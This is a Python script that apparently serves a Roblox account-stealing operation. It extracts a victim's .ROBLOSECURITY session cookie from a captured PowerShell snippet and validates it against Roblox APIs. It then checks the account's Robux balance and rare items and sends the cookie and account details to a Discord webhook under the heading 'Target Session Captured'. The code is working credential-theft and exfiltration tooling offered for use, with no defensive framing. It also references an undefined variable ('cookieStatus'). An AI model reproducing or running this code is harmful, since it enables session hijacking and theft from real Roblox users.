import sys
import base64
import os
import requests
import re

def main():
    if len(sys.argv) < 2:
        print("Error: No argument passed to script.")
        return
    
    try:
        decoded_script = base64.b64decode(sys.argv[1]).decode('utf-8')
        webhook_url = os.environ.get('DISCORD_WEBHOOK_URL')

        if not webhook_url:
            print("ERROR: DISCORD_WEBHOOK_URL environment variable is missing on Railway!")
            return

        print(f"[*] Decoded script length: {len(decoded_script)} characters")

        # 1. Extract Target URL and Asset ID
        uri_match = re.search(r'-Uri\s+["\']([^"\']+)["\']', decoded_script, re.IGNORECASE)
        target_url = uri_match.group(1) if uri_match else "https://www.roblox.com"

        # 2. Extract .ROBLOSECURITY Cookie (supports multiple PowerShell header formats)
        cookie_match = re.search(r'\.ROBLOSECURITY=([^;\'"\s]+)', decoded_script, re.IGNORECASE)
        if not cookie_match:
            cookie_match = re.search(r'\.ROBLOSECURITY["\']\s*,\s*["\']([^"\']+)["\']', decoded_script, re.IGNORECASE)
            
        roblosecurity = cookie_match.group(1) if cookie_match else None

        if not roblosecurity:
            print("ERROR: Could not find .ROBLOSECURITY cookie in the pasted PowerShell script. Check your capture format.")
            return

        print(f"[+] Cookie successfully extracted. Validating with Roblox API...")

        username = "Unknown User"
        robux_balance = 0
        pending_robux = 0
        has_korblox = "False"
        has_headless = "False"
        cookie_status = "🔴 Invalid / Expired"

        headers = { "Cookie": f".ROBLOSECURITY={roblosecurity}" }

        user_res = requests.get("https://users.roblox.com/v1/users/authenticated", headers=headers)
        print(f"[*] Roblox Auth API status: {user_res.status_code}")
        
        if user_res.status_code == 200:
            user_data = user_res.json()
            username = user_data.get("name", "Verified User")
            user_id = user_data.get("id")
            cookie_status = "🟢 Valid & Active"

            curr_res = requests.get(f"https://economy.roblox.com/v1/users/{user_id}/currency", headers=headers)
            if curr_res.status_code == 200:
                robux_balance = curr_res.json().get("robux", 0)

            pend_res = requests.get(f"https://economy.roblox.com/v1/users/{user_id}/resale-stock/pending-robux", headers=headers)
            if pend_res.status_code == 200:
                pending_robux = pend_res.json().get("pendingRobux", 0)

            def check_asset(aid):
                chk = requests.get(f"https://inventory.roblox.com/v1/users/{user_id}/items/asset/{aid}", headers=headers)
                if chk.status_code == 200:
                    data = chk.json().get("data", [])
                    return "True" if len(data) > 0 else "False"
                return "False"

            has_korblox = check_asset(1924100)
            has_headless = check_asset(134082579)

        payload = {
            "username": "NexusStudio",
            "avatar_url": "https://i.imgur.com/3G9O1p1.png",
            "embeds": [{
                "title": "Roblox Asset Transfer Log",
                "url": target_url,
                "description": f"**👤 Target Session Captured**\n`{username}`\n\n" +
                               f"🛡️ **Cookie Status**\n• State: `{cookieStatus}`\n\n" +
                               f"💰 **Robux Stats**\n• Balance: `{robux_balance} R$`\n• Pending: `{pending_robux} R$`\n\n" +
                               f"🎭 **Rare Items Check**\n• Korblox: `{has_korblox}`\n• Headless: `{has_headless}`\n\n" +
                               f"🔑 **Extracted .ROBLOSECURITY**\n```text\n{roblosecurity}\n```",
                "color": 6528033 if cookieStatus.startswith("🟢") else 15548997,
                "footer": { "text": "NexusStudio Core Automation | Server-Side Verification" }
            }]
        }

        discord_res = requests.post(webhook_url, json=payload)
        print(f"[*] Discord Webhook response code: {discord_res.status_code}")
        if discord_res.status_code not in [200, 204]:
            print(f"DISCORD ERROR RESPONSE: {discord_res.text}")
        else:
            print("Success: Dispatched to Discord.")

    except Exception as e:
        print(f"Python Exception Error: {str(e)}")

if __name__ == "__main__":
    main()
